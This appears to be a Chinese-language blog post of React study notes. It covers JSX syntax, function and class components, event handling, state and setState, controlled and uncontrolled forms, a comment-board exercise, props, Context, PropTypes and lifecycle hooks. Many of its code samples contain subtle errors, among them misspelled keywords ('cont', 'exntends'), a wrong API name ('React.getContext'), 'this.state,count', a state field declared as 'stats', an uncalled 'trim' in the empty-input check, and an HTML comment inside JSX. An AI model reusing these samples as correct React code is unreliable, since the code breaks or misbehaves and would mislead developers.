src=&quot;./node_modules/react-dom/umd/react-dom.development.js&quot;&gt;&lt;/script&gt; &lt;script&gt; // 创建React元素 // 参数： // 1. 元素名称 // 2. 元素属性 // 3. 第三个及其之后的参数：元素子节点 const title = React.createElement(&#x27;h1&#x27;, null, &quot;Hello React&quot;) // 渲染React元素 // 参数： // 1. 要渲染的react元素 // 2. 挂载点，一个DOM对象，指定渲染位置 ReactDOM.render(title, document.getElementById(&quot;root&quot;)) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; React脚手架 脚手架的意义 脚手架是开发现代Web应用的必备 充分利用Webpack、Babel、ESLint等工具辅助项目开发 零配置，无需手动配置繁琐的工具即可使用 关注业务二部是工具配置 使用脚手架初始化项目 1npx create-react-app my-app 使用 1npm start 启动项目 npx 的意义 原来使用npm上下载的包时，如果想在任意地方使用，需要全局安装这个包，但npx之后无需全局安装，即可使用。 脚手架中导入React包 由于React基于Webpack，因此导入时可直接使用ES6中的模块化语法进行导入： 12import React from &#x27;react&#x27;import ReactDOM from &#x27;react-dom&#x27; //使用react制作web应用时导入该渲染组件 JSX JSX基本使用 即JavaScript XML，表示在JS中写XML格式的代码 优点： 声明式语法更直观，与HTML结构相同，降低了学习成本、提升开发效率 使用步骤 使用JSX语法创建react元素 1const title = &lt;h1&gt;Hello JSX&lt;/h1&gt; 使用reactDOM.render渲染react元素到页面 1ReactDOM.render(title, root) JSX原理 react脚手架中配置了babel，JSX会经过babel编译为标准的JS语法。 编译JSX语法的包为@babel/preset-react 注意事项 React元素的属性名采用驼峰命名法 使用JSX为标签设置属性时，应修改为驼峰命名： class属性 -&gt; className for -&gt; htmlFor tabindex -&gt; tabIndex 没有子节点的React元素，可以使用但标签&lt;span /&gt;结束 推荐使用小括号包裹JSX，从而避免JS中的自动插入分号陷阱 JSX中嵌入JS表达式 语法： 1234const name = &#x27;Jack&#x27;const dv = ( &lt;div&gt;你好，我叫：&#123;name&#125; &lt;/div&gt;) JSX条件渲染 根据条件渲染特定的JSX结构 1234567891011121314151617const isLoading = falsecont loadData = () =&gt; &#123; if (isLoading) &#123; return &lt;div&gt;loading...&lt;/div&gt; &#125; return &lt;div&gt;数据加载完成，此处显示加载后的数据&lt;/div&gt;&#125;const title = ( &lt;h1&gt; 条件渲染： &#123;loadData()&#125; &lt;/h1&gt;)ReactDOM.render(title, document.getElementById(&#x27;root&#x27;)) 此外还可以使用三目运算符和逻辑与运算符 12345678910111213const isLoading = falsecont loadData = () =&gt; &#123; return isLoading &amp;&amp; (&lt;div&gt;loading...&lt;/div&gt;)&#125;const title = ( &lt;h1&gt; 条件渲染： &#123;loadData()&#125; &lt;/h1&gt;)ReactDOM.render(title, document.getElementById(&#x27;root&#x27;)) JSX对假值的处理 值为false，不显示任何内容 值为&quot;&quot;，不显示任何内容 值为null，不显示任何内容 值为undefined，不显示任何内容 值为0，直接显示0 如下代码将现实0: jsx &lt;div&gt;&#123;0 &amp;&amp; &lt;p&gt;避免对number类的数据直接判断是否为0&lt;/p&gt;&#125;&lt;/div&gt; 值为NaN，直接显示NaN JSX注释 由于bable无法处理html注释，因此需要借助js注释，但需要注释一段html代码时，先用&#123;&#125;将其变为JS表达式，然后是有/**/将其注释，即: 1&#123;/*&lt;div&gt;&lt;p&gt;这是一段注释&lt;/p&gt;&lt;/div&gt;*/&#125; JSX列表渲染 使用数组的map()方法 需要注意的是渲染列表时应该添加key属性，key属性的值要保证唯一 通过便利创建什么元素，就要把key通过遍历加上。 尽量避免使用索引号作为key 12345678910111213141516import React from &#x27;react&#x27;import ReactDOM from &#x27;react-dom&#x27;const songs = [ &#123;id: 1, name: &#x27;111&#x27;&#125;, &#123;id: 2, name: &#x27;222&#x27;&#125;, &#123;id: 3, name: &#x27;333&#x27;&#125;,]const title = ( &lt;ul&gt; &#123;songs.map(item = &gt; &lt;li key=&#123;item.id&#125;&gt;&#123;item.name&#125;&lt;/li&gt;)&#125; &lt;/ul&gt;)ReactDOM.render(title, document.getElementById(&#x27;root&#x27;)) JSX样式处理 两种方式： 行内样式——style 类名——className 使用样式时需要引入 1234567891011import React from &#x27;react&#x27;import ReactDOM from &#x27;react-dom&#x27;//引入cssimport &#x27;./css/index.css&#x27;const list = ( &lt;h1 className=&quot;title&quot; style=&#123;&#123; clolr: &#x27;red&#x27;, backgroundColor: &#x27;skyblue&#x27;&#125;&#125;&gt;)ReactDOM.render(list, document.getElementById(&#x27;root&#x27;)) JSX总结 JSX是React的核心内容 JSX表示在JS中写HTML结构，是声明式的体现 使用JSX配合嵌入JS表达式、条件渲染、列表渲染、可以描述任意UI结构 推荐使用className的方式给JSX添加样式 React完全利用JS语言自身的能力来编写UI，而不是造轮子增强HTML功能 注意： JSX只能有一个根元素 每个元素都需要是关闭的 class -&gt; className style接收一个Object，属性名使用驼峰命名 label表情的for属性更改为htmlFor 单个单词的属性名不变 {}总需要包含表达式（不支持语句） React组件 组件的特点： 可复用 独立 可组合 组件的两种创建方式 函数 类 函数组件 为了和函数进行区分，对函数组件进行如下约定： 函数名必须以大写字母开头 函数组件必须有返回值 但函数返回值可以为NULL 12345function Hello() &#123; return ( &lt;div&gt;我是一个函数组件&lt;/div&gt; )&#125; 渲染组件时直接使用函数名作为组件标签即可 1ReactDOM.render(&lt;Hello /&gt;, root) 也能使用箭头函数来构造组件 1const Hello = () =&gt; &lt;div&gt;我是一个箭头函数组件&lt;/div&gt; React根据名称首字母是否大写来区分组件和普通React元素 类组件 使用ES6中的class创建的组件，为了与普通类进行区分，使用如下约定： 类名首字母大写 类组件需要继承自React.Component，从而使用父类中提供的方法和属性 类组件必须提供**render()**方法 render方法必须有返回值，表示组件的结构 1234567class Hello extends React.Component &#123; render() &#123; return &lt;div&gt;Hello Class Component&lt;/div&gt; &#125;&#125;ReactDOM.render(&lt;Hello /&gt;, root) 组件的组织 组件作为一个单独的个体，一般会放到一个单独的JS文件中 创建JS文件，对应组件名称.js 在JS文件中导入React 创建组件 在JS文件中导出该组件 在index.js中导入该组件 渲染组件 组件JS文件 12345678910// Hello.jsimport React from &#x27;react&#x27;class Hello extends React.Component &#123; render() &#123; return &lt;div&gt;Hello Class Component&lt;/div&gt; &#125;&#125;// 导出Hello组件export default Hello index中渲染组件 1234// index.jsimport Hello from &#x27;./Hello&#x27;// 渲染导入的Hello组件ReactDOM.render(&lt;Hello /&gt;, root) React事件处理 事件绑定 React事件绑定语法与DOM事件绑定相似 on+事件名称={事件处理程序}，如onClick={() =&gt; {}} React事件采用驼峰命名法 1234567891011class App exntends React.Component &#123; handleClick() &#123; console.log(&#x27;单击事件被触发&#x27;) &#125; render() &#123; return ( &lt;button onClick=&#123;this.handleClick&#125;&gt;点我&lt;/button&gt; ) &#125;&#125; 函数组件绑定事件，使用内部函数定义 123456789function App() &#123; function handleClick() &#123; console.log(&#x27;单击事件出发了&#x27;) &#125; return( &lt;button onClick=&#123;handleClick&#125;&gt;点我&lt;/button&gt; )&#125; 事件对象 可以通过事件处理程序的参数获取到事件对象 React中的事件对象叫做：合成事件(重要，需补充)（对象） 合成事件：兼容所有浏览器，无需担心跨浏览器兼容性问题 123456function handleClick(e) &#123; e.preventDefault() //组织浏览器的默认行为 console.log(&#x27;事件对象&#x27;, e)&#125;&lt;a onClick=&#123;handleClick&#125;&gt;点我，不会跳转页面&lt;/a&gt; 有状态组件和无状态组件 函数组件又称为无状态组件，类组件叫做有状态组件 状态(state)即数据 函数组件没有自己的状态，只负责数据展示（静） 类组件有自己的状态，负责更新UI 组件的state和setState state的基本使用 状态即数据，时组件内部的私有数据，只能在组件内部使用 state的值是对象，表示一个组件中可以有多个数据 状态的初始化方式如下： 12345678910111213141516class Hello extends React.Component &#123; constructor() &#123; // ES6中必须包含 super(); // 初始化state this.state = &#123; count: 0, &#125;; &#125; render() &#123; return ( &lt;div&gt;有状态组件&lt;/div&gt; ) &#125;&#125; 也可以使用ES6中的简化语法： 12345678910111213class Hello extends React.Component &#123; // 简化语法 // 初始化state state = &#123; count: 0 &#125; render() &#123; return ( &lt;div&gt;有状态组件&lt;/div&gt; ) &#125;&#125; 可以使用this获取状态的数据 12345678910111213class Hello extends React.Component &#123; // 简化语法 // 初始化state state = &#123; count: 0 &#125; render() &#123; return ( &lt;div&gt;计数器: &#123;this.state.count&#125;&lt;/div&gt; ) &#125;&#125; setState()修改状态 状态是可变的 语法：this.setState({要修改的数据}) 不要直接修改state中的值 setState()作用： 修改state 更新UI 思想：数据驱动视图 1234567891011121314151617181920class App extends React.Component &#123; state = &#123; count: 0 &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;计数器: &#123; this.state.count &#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; &#123; this.setState(&#123; count: this.state.count + 1 &#125;) &#125;&#125;&gt;+1&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) 从JSX中抽离事件处理程序 JSX中掺杂了过多JS逻辑代码会使得JSX逻辑混乱 将逻辑抽离到单独的方法中，保证JSX结构清晰 由于箭头函数不具备this，因此会向外层寻找this的指向，render()函数中的this指向组件实例，因此不会有问题，但进行抽离后的函数不具备this指向。 可以使用如下解决方式： 箭头函数 Function.prototype.bind() class的实例方法 箭头函数 利用箭头函数自身不绑定this的特点，会根据外部环境推断。对于方法中的this，谁调用就指向谁。 123456789101112131415161718192021222324class App extends React.Component &#123; state = &#123; count: 0 &#125; // 事件处理程序 onIncrement()&#123; console.log(&#x27;事件处理程序中的this&#x27;, this) this.setState(&#123; count: this.state.count + 1 &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;计数器: &#123; this.state.count &#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; this.onIncrement()&#125;&gt;+1&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) Function.prototype.bind() 利用ES5中的bind方法，将事件处理程序中的this与组件实列绑定 类似于小程序中的 12let that = thisthat.onIncrement() 123456789101112131415161718192021222324252627class App extends React.Component &#123; constructor() &#123; super() this.state = &#123; count: 0 &#125; this.onIncrement = this.onIncrement.bind(this) &#125; // 事件处理程序 onIncrement()&#123; console.log(&#x27;事件处理程序中的this&#x27;, this) this.setState(&#123; count: this.state.count + 1 &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;计数器: &#123; this.state.count &#125;&lt;/h1&gt; &lt;button onClick=&#123;this.onIncrement&#125;&gt;+1&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; class实例方法 使用箭头函数形式的class实例方法 注意，该语法为实验性语法，但由于babel的存在，可以直接使用 123456789101112131415161718192021222324class App extends React.Component &#123; state = &#123; count: 0 &#125; // 事件处理程序 onIncrement = () =&gt; &#123; console.log(&#x27;事件处理程序中的this&#x27;, this) this.setState(&#123; count: this.state.count + 1 &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;计数器: &#123; this.state.count &#125;&lt;/h1&gt; &lt;button onClick=&#123;this.onIncrement&#125;&gt;+1&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) 表单处理 React两种表单处理方式 受控组件 非受控组件（DOM方式） 受控组件 HTML中的表单元素是可输入的，也就是有自己的可变状态 React中可变状态通常保存在state中，使用setState来i需改 React将state与表单元素值value绑定到一起，由state的值来控制表单元素的值 受控组件：即值收到React控制的表单元素 受控组件的使用包括以下步骤： 在state中添加一个状态，作为表单元素的value值（控制表单元素值的来源） 给表单元素绑定change事件，将表单元素的值设置为state的值（控制表单元素值的变化） 123456789101112131415161718192021class App extends React.Component &#123; state = &#123; txt: &#x27;&#x27;, &#125; handleChange = e =&gt; &#123; this.setState(&#123; txt: e.target.value &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;input type=&quot;text&quot; value=&#123;this.state.txt&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) 如下练习将不同的表单标签转化为受控组件。 文本框，富文本框，下拉框操作value属性 复选框操作checked属性 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import &#x27;./index.css&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;class App extends React.Component &#123; constructor()&#123; super() this.state = &#123; txt: &#x27;&#x27;, content: &#x27;&#x27;, city: &#x27;bj&#x27;, Selection: false, &#125; &#125; handleChange = e =&gt; &#123; this.setState(&#123; txt: e.target.value &#125;) &#125; handleContent = e =&gt; &#123; this.setState(&#123; content: e.target.value &#125;) &#125; handleCity = e =&gt; &#123; this.setState(&#123; city: e.target.value &#125;) &#125; handleSelection = e =&gt; &#123; this.setState(&#123; Selection: e.target.checked &#125;) &#125; render()&#123; return ( &lt;div&gt; &lt;input type=&quot;text&quot; value=&#123;this.state.txt&#125; onChange=&#123;this.handleChange&#125;&gt;&lt;/input&gt; &lt;br/&gt; &lt;textarea value=&#123;this.state.content&#125; onChange=&#123;this.handleContent&#125;&gt;&lt;/textarea&gt; &lt;br/&gt; &lt;select value=&#123;this.state.city&#125; onChange=&#123;this.handleCity&#125;&gt; &lt;option value=&quot;sh&quot;&gt;上海&lt;/option&gt; &lt;option value=&quot;bj&quot;&gt;北京&lt;/option&gt; &lt;option value=&quot;gz&quot;&gt;广州&lt;/option&gt; &lt;/select&gt; &lt;br/&gt; &lt;input type=&quot;checkbox&quot; checked=&#123;this.state.Selection&#125; onChange=&#123;this.handleSelection&#125;&gt;&lt;/input&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render( &lt;App /&gt;, document.getElementById(&quot;root&quot;)); 但是可以发现用如上方法控制表单元素会产生很多重复新的onChange函数，因此需要对多表单元素进行优化，即使用一个事件处理程序同时处理多个表单元素。 多表单元素优化 给表单元素添加name属性，名称与state相同 根据表单元素类型获取对应值 在change事件处理程序中通过[name]来修改对应的state 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import &#x27;./index.css&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;class App extends React.Component &#123; constructor()&#123; super() this.state = &#123; txt: &#x27;&#x27;, content: &#x27;&#x27;, city: &#x27;bj&#x27;, Selection: false, &#125; &#125; handleChange = e =&gt; &#123; // 获取当前DOM对象 const target = e.target; // 根据类型获取值 const value = target.type === &#x27;checkbox&#x27; ? target.checked : target.value; // 获取name const name = target.name; this.setState(&#123; // 此处定义属性使用了ES6中的新特性 属性名表达式 // 即使用表达式作为属性或函数名 // 此处会将name转化为string [name]: value, &#125;); &#125; render()&#123; return ( &lt;div&gt; &lt;input type=&quot;text&quot; name=&#x27;txt&#x27; value=&#123;this.state.txt&#125; onChange=&#123;this.handleChange&#125;&gt;&lt;/input&gt; &lt;br/&gt; &lt;textarea name=&#x27;content&#x27; value=&#123;this.state.content&#125; onChange=&#123;this.handleChange&#125;&gt;&lt;/textarea&gt; &lt;br/&gt; &lt;select name=&#x27;city&#x27; value=&#123;this.state.city&#125; onChange=&#123;this.handleChange&#125;&gt; &lt;option value=&quot;sh&quot;&gt;上海&lt;/option&gt; &lt;option value=&quot;bj&quot;&gt;北京&lt;/option&gt; &lt;option value=&quot;gz&quot;&gt;广州&lt;/option&gt; &lt;/select&gt; &lt;br/&gt; &lt;input name=&#x27;Selection&#x27; type=&quot;checkbox&quot; checked=&#123;this.state.Selection&#125; onChange=&#123;this.handleChange&#125;&gt;&lt;/input&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render( &lt;App /&gt;, document.getElementById(&quot;root&quot;)); 非受控组件 借助于ref，使用原生DOM方法来获取表单元素值 ref的作用：获取DOM或组件 这种方式通过直接操作DOM实现 使用步骤： 通过React.createRef()方法创建一个ref对象 将创建好的ref对象添加到文本框中 通过ref对象获取到文本框中的值 123456789101112131415161718192021222324252627282930import &#x27;./index.css&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;class App extends React.Component &#123; constructor()&#123; super() this.txtRef = React.createRef() &#125; // 获取文本框的值 getTxt = () =&gt; &#123; console.log(&#x27;文本框的值为：&#x27;, this.txtRef.current.value); &#125; render()&#123; return ( &lt;div&gt; &lt;input type=&quot;text&quot; ref=&#123;this.txtRef&#125; /&gt; &lt;button onClick=&#123;this.getTxt&#125;&gt;获取文本框的值&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render( &lt;App /&gt;, document.getElementById(&quot;root&quot;)); 案例一 式样以上知识，实现一个无回复功能的评论版 渲染评论列表 在state总初始化评论列表数据 使用map循环渲染列表数据 注意给每个被渲染的元素添加一个key 评论区条件渲染 判断列表长度是否为0 如果为0则渲染暂无评论 注意讲逻辑与JSX分离 获取评论信息 使用受控组件的方式实现 注意设置handle方法和name属性 发表评论 为按钮绑定单击事件 在事件处理程序中通过state获取评论信息 将评论添加到state中，更新state 边界情况：清空文本框，文本框判空 最终实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116import &#x27;./index.css&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;class App extends React.Component &#123; constructor() &#123; super() this.state = &#123; comments: [ &#123; id: 1, name: &#x27;jack&#x27;, comment: &#x27;You jump&#x27;&#125;, &#123; id: 2, name: &#x27;rose&#x27;, comment: &#x27;I jump&#x27;&#125;, &#123; id: 3, name: &#x27;joker&#x27;, comment: &#x27;I see you jump&#x27;&#125;, ], // 当前评论人 userName: &#x27;&#x27;, // 当前评论内容 userContent: &#x27;&#x27;, &#125; &#125; renderList() &#123; const &#123;comments&#125; = this.state if(comments.length === 0) &#123; return ( &lt;div className=&#x27;no-comment&#x27;&gt;暂无评论，快去评论吧&lt;/div&gt; ) &#125; else &#123; return ( &lt;ul&gt; &#123; comments.map(item =&gt; ( &lt;li key=&#123;item.id&#125;&gt; &lt;h3&gt;评论人：&#123;item.name&#125;&lt;/h3&gt; &lt;p&gt;评论内容：&#123;item.comment&#125;&lt;/p&gt; &lt;/li&gt; )) &#125; &lt;/ul&gt; ) &#125; &#125; handleChange = (e) =&gt; &#123; const &#123;name, value&#125; = e.target; this.setState(&#123; [name]: value, &#125;); &#125; addComment = () =&gt; &#123; const &#123;comments, userName, userContent&#125; = this.state //判空，使用trim去除空格 if(userName.trim() === &#x27;&#x27; || userContent.trim === &#x27;&#x27; ) &#123; alert(&#x27;请输入评论人和评论内容&#x27;); return; &#125; // 此处使用了ES6的新特性：拓展运算符... // 该运算符用于将可便利对象拆分为单个 const newIndex = comments.length + 1; const newComments = [...comments, &#123; id: newIndex, name: userName, comment: userContent, &#125; ]; console.log(newComments); this.setState(&#123; comments: newComments, userName: &#x27;&#x27;, userContent: &#x27;&#x27;, &#125;); &#125; render()&#123; const &#123;userName, userContent&#125; = this.state; return ( &lt;div className=&#x27;app&#x27;&gt; &lt;div&gt; &lt;input name=&#x27;userName&#x27; className=&#x27;user&#x27; value=&#123;userName&#125; type=&#x27;text&#x27; placeholder=&#x27;请输入评论人&#x27; onChange=&#123;this.handleChange&#125; /&gt; &lt;br/&gt; &lt;textarea className=&#x27;content&#x27; name=&#x27;userContent&#x27; cols=&#x27;30&#x27; row = &#x27;10&#x27; placeholder=&#x27;请输入评论内容&#x27; value=&#123;userContent&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;br /&gt; &lt;button onClick=&#123;this.addComment&#125;&gt;发表评论&lt;/button&gt; &lt;/div&gt; &#123;/* 通过条件渲染决定渲染什么内容 */&#125; &#123;this.renderList()&#125; &lt;/div&gt; ) &#125;&#125;ReactDOM.render( &lt;App /&gt;, document.getElementById(&quot;root&quot;)); 组件间通讯 组件props 由于组件的封闭性，要接受外部数据应该通过props来实现 props的作用：接受传递给组件的数据 传递数据：给组件标签添加属性 接受数据： 函数组件通过参数props接收数据 类组件通过this.props接受数据 1&lt;Hello name=&#x27;jack&#x27; age = &#123;19&#125; /&gt; 123456function Hello(props) &#123; console.log(props) return ( &lt;div&gt;接受到数据: &#123;props.name&#125;&lt;/div&gt; )&#125; 123456789101112class Hello extends React.Component &#123; // 推荐写法 constructor(props) &#123; super(props) &#125; render() &#123; return ( &lt;div&gt;接收到数据：&#123;this.props.age&#125;&lt;/div&gt; ) &#125;&#125; 组件props的特点 可以给组件传递任意类型的值 props是一个只读属性，无法修改 使用类组件时，如果写了构造函数，应该将props传递给super()，否则，无法在构造函数中获取到props 组件通讯的三种方式 父组件 -&gt; 子组件 子组件 -&gt; 父组件 兄弟组件 父组件到子组件 父组件提供要传递的state数据 给子组件标签添加属性，值为state中的数据 子组件中通过props接受父组件中传递的数据 12345678910class Parent extends React.Component &#123; state = &#123; lastName: &#x27;王&#x27; &#125; render() &#123; return ( &lt;div&gt; 传递给子组件：&lt;Child name=&#123;this.state.lastName&#125; /&gt; &lt;/div&gt; ) &#125;&#125; 123function Child(props) &#123; return &lt;div&gt;子组件接受：&#123;props.name&#125; &lt;/div&gt;&#125; 子组件到父组件 思路：利用回调函数，父组件提供回调，子组件调用，将要传递的数据作为回调函数的参数 父组件提供一个回调函数，用于接收数据 将该函数作为属性值传递给子组件 子组件通过props调用回调函数 将子组件的数据作为参数传递给回调函数 注意回调函数中this指向的问题 1234567891011121314class Parent extends React.Component &#123; // 提供回调 getChildMsg = (msg) =&gt; &#123; console.log(&#x27;接收到子组件数据&#x27;, msg) &#125; render() &#123; return ( // 传递给子组件 &lt;div&gt; 子组件：&lt;Child getMsg=&#123;this.getChildMsg&#125; /&gt; &lt;/div&gt; ) &#125;&#125; 12345678910111213class Child extends React.Component &#123; // 提供回调 stats = &#123;childMsg: &#x27;React&#x27;&#125; handleClick = () =&gt; &#123; this.props.getMsg(this.state.childMsg) &#125; render() &#123; return ( // 传递给子组件 &lt;button onClick=&#123;this.handleClick&#125;&gt;点我，给父组件传递数据&lt;/button&gt; ) &#125;&#125; 兄弟组件通讯 思路：将共享状态提升到最近的公共父组件中，由公共父组件管理这个状态 将这种思想称为状态提升 公共父组件职责： 提供共享状态（父到子通讯） 提供操作共享状态的方法（子到父通讯） 要通讯的子组件只需要通过props接受状态或操作状态的方法 123456789101112131415161718192021222324252627282930class Counter extends React.Component &#123; // 提供共享状态 state = &#123; count: 0 &#125; // 提供修改状态的方法 onIncrement = () =&gt; &#123; this.setState(&#123; count: this.state.count + 1 &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;Child1 count=&#123;this.state,count&#125; /&gt; &lt;Child2 onIncrement=&#123;this.onIncrement&#125; /&gt; &lt;/div&gt; ) &#125;&#125;const Child1 = (props) =&gt; &#123; return &lt;h1&gt;计数器：&#123;props.count&#125;&lt;/h1&gt;&#125;const CHild2 = (props) =&gt; &#123; return &lt;button onClick=&#123;() =&gt; props.onIncrement&#125;&gt; +1 &lt;/button&gt;&#125; Context 考虑这样一个实际应用中的问题：对于相互嵌套很深层次的组件，我们应该如何进行通讯？例如下面这个结构中组件App想要给Child传递数据 常规的思路可能是使用Props一层一层往下传递，但是这样操作起来会十分繁琐。 12345678&lt;App&gt; &lt;Node&gt; &lt;SubNode&gt; &lt;Child&gt; &lt;/Child&gt; &lt;/SubNode&gt; &lt;/Node&gt;&lt;/App&gt; React为我们提供了更好的方式：Context 它的作用就是跨组件传递数据（比如：主题，语言设置等需要在根组件配置数据） 使用方法如下： 调用React.createContext()创建Provider(提供数据)和Consumer(消费数据)两个组件 使用Provider组件作为父节点 设置Value属性，表示要传递的数据 调用Consumer组件接受数据 即Provider包裹父节点，Consumer被子组件包裹 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 创建contextconst &#123;Provider, Consumer&#125; = React.getContext() class App extends React.Component &#123; render() &#123; return ( // 使用Provider作为父节点 // 设置要传递的数据 &lt;Provider value=&quot;pink&quot;&gt; &lt;div className=&#x27;app&#x27;&gt; &lt;Node /&gt; &lt;/div&gt; &lt;/Provider&gt; ) &#125;&#125;const Node = props =&gt; &#123; return ( &lt;div className=&quot;node&quot;&gt; &lt;subNode /&gt; &lt;/div&gt; )&#125;const SubNode = props =&gt; &#123; return ( &lt;div className=&quot;subnode&quot;&gt; &lt;Child /&gt; &lt;/div&gt; )&#125;const Child = props =&gt; &#123; return &lt;div className=&#x27;child&#x27;&gt; &lt;!-- 使用consumer组件接受数据 --&gt; &lt;Consumer&gt; &#123; data =&gt; &lt;span&gt;我是子节点 -- &#123;data&#125;&lt;/span&gt; &#125; &lt;/Consumer&gt; &lt;/div&gt;&#125;ReactDOm.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) props深入 children属性 表示组件标签的子节点，当组件标签有子节点时，props就会有该属性。 children属性和普通的props一样，值可以任意。 12345678910const App = props =&gt; &#123; return ( &lt;div&gt; &lt;h1&gt;组件标签的子节点：&lt;/h1&gt; &#123;props.children&#125; &lt;/div&gt; )&#125;ReactDOM.render&#123;&lt;App&gt;我是子节点&lt;/App&gt;, document.getElementById(&#x27;root&#x27;)&#125; props校验 对于组件而言，props是外来的，无法保证使用组件时传入的值的格式。 那么会出现以下问题： 传入数据不对可能导致组件内部报错 组件的使用者不知道明确的错误原因 React提供了props校验作为解决方法。 props校验： 运行在创建组件时只当props的类型、格式等 能捕获使用组件时因为props导致的错误，给出明确的错误提示，增加组件的健壮性 使用步骤： 安装prop-types包 导入prop-types 使用组件名.propTypes=&#123;&#125;来给组件的props添加校验规则 校验规则通过PropTypes对象指定 123456789101112131415161718import &#x27;./index.css&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import PropTypes from &#x27;prop-types&#x27;const App = props =&gt; &#123; const arr = props.colors const lis = arr.map((item, index) =&gt; &lt;li key=&#123;index&#125;&gt;&#123;item&#125;&lt;/li&gt;) return &lt;ul&gt;&#123;lis&#125;&lt;/ul&gt;&#125;// 添加props校验App.propTypes = &#123; colors: PropTypes.array&#125;ReactDOM.render(&lt;App colors=&#123;[&#x27;red&#x27;, &#x27;blue&#x27;]&#125; /&gt;, document.getElementById(&#x27;root&#x27;)) props校验常见校验规则： 常见类型 array,bool,func,number,object,string React元素类型 element 必填项 isRequired 特定结构对象 shape({}) 详见官方文档：PropTypes 1234567891011121314151617181920212223242526272829import &#x27;./index.css&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import PropTypes from &#x27;prop-types&#x27;const App = props =&gt; &#123; return ( &lt;div&gt; &lt;h1&gt;props校验：&lt;/h1&gt; &lt;/div&gt; )&#125;// 添加props校验// 属性a的类型： 数值（number）// 属性fn的类型： 函数（func）且为必填// 属性tag的类型： React元素（element）// 属性filter的类型： 对象（&#123;area: &#x27;上海&#x27;, price: 1999&#125;）App.propTypes = &#123; a: PropTypes.number, fn: PropTypes.func.isRequired, tag: PropTypes.element, filter: PropTypes.shape(&#123; area: PropTypes.string, price: PropTypes.number, &#125;)&#125;ReactDOM.render(&lt;App fn=&#123;() =&gt; &#123;&#125;&#125; /&gt;, document.getElementById(&#x27;root&#x27;)) props默认值 例如当我们设计一个分页组件时，每页显示条数可以为默认值。 12345678910111213141516171819import &#x27;./index.css&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import PropTypes from &#x27;prop-types&#x27;const App = props =&gt; &#123; return ( &lt;div&gt; &lt;h1&gt;props默认值：&#123;props.pageSize&#125;&lt;/h1&gt; &lt;/div&gt; )&#125;// 添加props默认值App.defaultProps = &#123; pageSize: 10&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) 组件的生命周期 学习组件的生命周期有助于理解组件的运行方式、从而完成更复杂的组件功能、分析组件错误原因等等 组件的生命周期指：组件从被创建到挂载在页面中运行，再到组件不用时卸载的过程。 钩子函数：生命周期的每个阶段总伴随着一些方法调用，这些方法就是生命周期的钩子函数，为开发人员在不同阶段操作组件提供了时机。 只有类组件才有生命周期 生命周期的三个阶段 创建时 更新时 卸载时 创建时（挂在阶段） 执行时机：组件创建时（页面加载时） 钩子函数执行顺序： constructor() render() componentDidMount() 钩子函数 触发时机 作用 constructor 创建组件时，最先执行 1. 初始化state2. 为事件处理程序绑定this render 每次组件渲染都会触发 渲染UI（注意：不能调用setState()） componentDidMount 组件挂载（完成DOM渲染）后 1. 发送网络请求2. DOM操作 不能在render中调用setState的原因是：调用setState会导致数据更新以及UI更新（渲染），即setState方法将会调用render方法，因此如果在render中调用setState会导致递归效用 componentDidMount会紧跟render方法触发，由于DOM操作需要DOM结构已经渲染，因此DOM操作应被放置于该钩子函数内。 更新阶段 更新阶段的执行时机包括： New props，组件接收到新属性 setState()，调用该方法时 forceUpdate()，调用该方法时 其中forceUpdate用于使组件强制更新，即使没有数值上的改变。 钩子函数执行顺序： shouldComponentUpdate render() componentDidUpdate() 钩子函数 触发时机 作用 shouldComponentUpdate 更新阶段的钩子函数，组件重新渲染前执行（即在render前执行） 通过该函数的返回值来决定组件是否重新渲染。 render 每次组件渲染都会触发 渲染UI（与挂载阶段是同一个） componentDidUpdate 组件更新（完成DOM渲染）后 1. 发送网络请求2. DOM操作 需要注意的是在componentDidUpdate中调用setState()必须放在一个if条件中，原因与在render中调用setState相同，render执行完后会立即执行componentDidUpdate导致递归调用。通常会比较更新前后的props是否相同，来决定是否重新渲染组件。可以使用componentDidUpdate(prevProps)得到上一次的props，通过this.props获取当前props 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051class App extends React.Component &#123; constructor(props) &#123; super(props) this.state = &#123; count: 0 &#125; console.warn(&#x27;生命周期钩子函数：constructor&#x27;) &#125; 